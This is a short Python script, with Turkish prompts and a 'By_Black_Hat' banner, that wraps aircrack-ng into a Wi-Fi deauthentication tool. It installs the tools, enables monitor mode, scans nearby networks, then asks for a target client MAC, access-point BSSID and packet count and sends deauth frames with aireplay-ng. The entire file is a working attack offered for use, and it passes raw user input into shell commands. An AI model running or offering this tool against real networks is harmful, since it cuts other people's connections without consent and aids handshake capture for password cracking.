#!/usr/bin/env python

import os

os.system("sudo apt-get update")
os.system("sudo apt-get install figlet")
os.system("sudo apt-get install aircrack-ng")

os.system("clear")
print("\033[33m")
os.system("figlet By_Black_Hat EcY")
print("\033[36m")
os.system("figlet DeAuth AracI")

print("\033[32m"+"""
*_*_*_* DİKKAT DİKKAT *_*_*_*\n
*_*_*_* Sadece monitor ozelligi olan *_*_*_*\n
*_*_*_* harici wi-fi adaptorle çalışma yapılabilir !!! *_*_*_* 

"""+"\033[0m")

lanName=input("Network arayüz adı : ")

os.system("airmon-ng start"+" "+lanName) 
os.system("airodump-ng"+" "+lanName) 


hedefistasyon=input("hedef mac adresi : ")
hedefagbssid=input("Ag bssid adresi : ")
yollanacakpaket=input("Yollanacak paket sayısı : ")

os.system("aireplay-ng --deauth"+" "+yollanacakpaket+" "+"-a"+" "+hedefagbssid+" "+"-c"+" "+hedefistasyon+" "+lanName)
